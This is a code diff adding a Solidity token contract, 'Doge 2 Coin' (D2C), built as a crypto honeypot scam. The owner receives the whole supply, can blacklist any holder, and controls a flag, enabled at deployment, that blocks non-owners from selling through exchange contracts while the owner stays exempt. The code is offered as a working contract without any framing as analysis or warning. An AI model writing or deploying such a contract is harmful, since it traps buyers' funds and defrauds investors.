@@ -1,0 +1,92 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Doge2Coin {
+    string public name;
+    string public symbol;
+    uint256 public totalSupply;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    mapping(address => bool) public blacklist;
+    bool public honeypotEnabled;
+    uint256 public maxTokensPerTransaction;
+    uint256 public maxTokensPerWallet;
+    address public owner;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event BlacklistUpdated(address indexed account, bool isBlacklisted);
+    event HoneypotEnabled(bool isEnabled);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only contract owner can call this function");
+        _;
+    }
+
+    constructor() {
+        name = "Doge 2 Coin";
+        symbol = "D2C";
+        totalSupply = 100000000000;
+        balanceOf[msg.sender] = totalSupply;
+        honeypotEnabled = true;
+        maxTokensPerTransaction = 50000000;
+        maxTokensPerWallet = 100000000;
+        owner = msg.sender;
+    }
+
+    function transfer(address _to, uint256 _value) external returns (bool) {
+        require(!blacklist[msg.sender], "Sender is blacklisted");
+        require(_value <= balanceOf[msg.sender], "Insufficient balance");
+        require(_value <= maxTokensPerTransaction, "Exceeds maximum tokens per transaction");
+        require(balanceOf[_to] + _value >= balanceOf[_to], "Overflow error");
+
+        if (msg.sender != owner) {
+            require(!honeypotEnabled || msg.sender == tx.origin, "Cannot sell tokens");
+        }
+
+        balanceOf[msg.sender] -= _value;
+        balanceOf[_to] += _value;
+
+        emit Transfer(msg.sender, _to, _value);
+        return true;
+    }
+
+    function approve(address _spender, uint256 _value) external returns (bool) {
+        allowance[msg.sender][_spender] = _value;
+
+        emit Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {
+        require(!blacklist[_from], "Sender is blacklisted");
+        require(_value <= balanceOf[_from], "Insufficient balance");
+        require(_value <= allowance[_from][msg.sender], "Insufficient allowance");
+        require(_value <= maxTokensPerTransaction, "Exceeds maximum tokens per transaction");
+        require(balanceOf[_to] + _value >= balanceOf[_to], "Overflow error");
+
+        if (_from != owner) {
+            require(!honeypotEnabled || msg.sender == tx.origin, "Cannot sell tokens");
+        }
+
+        balanceOf[_from] -= _value;
+        balanceOf[_to] += _value;
+        allowance[_from][msg.sender] -= _value;
+
+        emit Transfer(_from, _to, _value);
+        return true;
+    }
+
+    function updateBlacklist(address _account, bool _isBlacklisted) external onlyOwner {
+        blacklist[_account] = _isBlacklisted;
+
+        emit BlacklistUpdated(_account, _isBlacklisted);
+    }
+    
+    function enableHoneypot(bool _isEnabled) external onlyOwner {
+        honeypotEnabled = _isEnabled;
+
+        emit HoneypotEnabled(_isEnabled);
+    }
+}
